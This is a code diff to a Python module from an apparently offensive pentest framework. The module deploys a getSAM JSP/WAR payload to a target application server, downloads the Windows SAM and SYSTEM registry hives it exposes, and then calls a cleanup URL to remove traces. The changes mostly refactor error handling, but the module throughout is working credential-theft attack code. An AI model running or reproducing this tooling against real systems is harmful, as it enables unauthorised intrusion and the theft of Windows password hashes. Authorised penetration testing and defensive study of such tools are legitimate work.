@@ -12,18 +12,21 @@ class Auxiliary:
     def download_file(self, url, fname):
         local_filename = fname
         try:
-            r = utility.requests_get(url, stream=True)
-            utility.Msg("Attempting to retrieve %s as " + fname % r, LOG.DEBUG)
-            with open(local_filename, 'wb') as f:
-                for chunk in r.iter_content(chunk_size=1024):
-                    if chunk:
-                        f.write(chunk)
-                        f.flush()
-            return local_filename
+            response = utility.requests_get(url, stream=True)
+            if response.status_code == 200:
+                with open(local_filename, 'wb') as hive:
+                    for chunk in response.iter_content(chunk_size=1024):
+                        if chunk:
+                            hive.write(chunk)
+                            hive.flush()
+                utility.Msg("Successfully saved {0} to local directory".format(fname), LOG.SUCCESS)
+                return local_filename
+            else:
+                utility.Msg("Error downloading {0} (Http code: {1})".format(
+                    fname, response.status_code), LOG.ERROR)
         except Exception, e:
-            utility.Msg("Reponse code:" + r.code, LOG.DEBUG)
-            #utility.Msg(response.text, LOG.DEBUG)
-            utility.Msg("Error downloading the " + fname + " file: %s" % e, LOG.ERROR)
+            utility.Msg("Problem downloading {0} Exception: {1}".format(
+                fname, e), LOG.ERROR)
 
     def Cleanup(self, fingerengine, fingerprint):
         url = "http://{0}:{1}/getSAM/getSAM.jsp?del".format(
@@ -31,19 +34,13 @@ class Auxiliary:
 
         try:
             response = utility.requests_get(url)
-            utility.Msg("Calling delete:\n" + url, LOG.DEBUG)
+            if response.status_code == 200:
+                utility.Msg("Files cleaned up from server.")
+            else:
+                utility.Msg("Failed to cleanup (Http code: %d)" % response.status_code, LOG.ERROR)
         except Exception, e:
-            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
-            #utility.Msg(response.text, LOG.DEBUG)
-            utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
+            utility.Msg("Exception during cleanup: {0}".format(e), LOG.ERROR)
             return
-
-        if response.status_code == 200:
-            utility.Msg("Files cleaned up from server.", LOG.SUCCESS)
-        else:
-            utility.Msg(response.code, LOG.DEBUG)
-            utility.Msg(response.text, LOG.DEBUG)
-            utility.Msg("We might not have cleaned the files up correctly", LOG.ERROR)
 
     def __init__(self):
         self.name = 'Obtain Sam and System Registries'
@@ -64,7 +61,7 @@ class Auxiliary:
             return
 
         if fingerprint.version in ["5.0", "5.1"]:
-            utility.Msg("Using DFS, switching to getSAM.jsp.", LOG.DEBUG)
+            utility.Msg("Deploying getSAM.jsp.", LOG.DEBUG)
             fingerengine.options.deploy = "./src/lib/getSAM.jsp"
         else:
             utility.Msg("Deploying getSAM.war.", LOG.DEBUG)
@@ -72,7 +69,7 @@ class Auxiliary:
 
         deployer.run(fingerengine)
 
-        sleep(5)
+        sleep(3)
 
         url = "http://{0}:{1}/getSAM/getSAM.jsp".format(
             fingerengine.options.ip, fingerprint.port)
@@ -81,22 +78,16 @@ class Auxiliary:
         try:
             response = utility.requests_get(url)
         except Exception, e:
-            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
             utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
             return
 
         if response.status_code == 200:
-            utility.Msg("Deploy worked. Getting the files...")
-            filenames = response.text
+            filenames = response.text.rstrip()
             if len(filenames) != 0:
-                samfile = filenames.split("<")[0]
-                samfile = samfile.translate(None, ' \n')
-                samfile = samfile.rstrip()
-                systemf = filenames.split(">")[1]
-                systemf.translate(None,' \n')
-                systemf = systemf.rstrip()
-
-                utility.Msg("Data in response. SAM:" + samfile + " and System:" + systemf, LOG.DEBUG)
+                samfile = filenames.split('<')[0]
+                samfile = str(samfile).translate(None, "\r\n ")
+                systemf = filenames.split('>')[1]
+                systemf = str(systemf).translate(None, "\r\n ")
 
                 urlsam = "http://{0}:{1}/getSAM/{2}".format(
                                         fingerengine.options.ip, fingerprint.port, samfile)
@@ -104,14 +95,10 @@ class Auxiliary:
 
                 urlsys = "http://{0}:{1}/getSAM/{2}".format(
                                         fingerengine.options.ip, fingerprint.port, systemf)
-                self.download_file(urlsys, "System")
-                utility.Msg("Downloaded System/SAM to local directory.", LOG.SUCCESS)
+                self.download_file(urlsys, "SYSTEM")
 
-                self.Cleanup(fingerengine, fingerprint)
+            else:
+                utility.Msg("Was not running as admin, no file names in response.", LOG.DEBUG)
 
-        else:
-            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
-            #utility.Msg("Response data:\n" + response.text, LOG.DEBUG)
-            utility.Msg("Seems the module didn't deploy correctly...", LOG.ERROR)
-
+        self.Cleanup(fingerengine, fingerprint)
         fingerengine.options.deploy = None
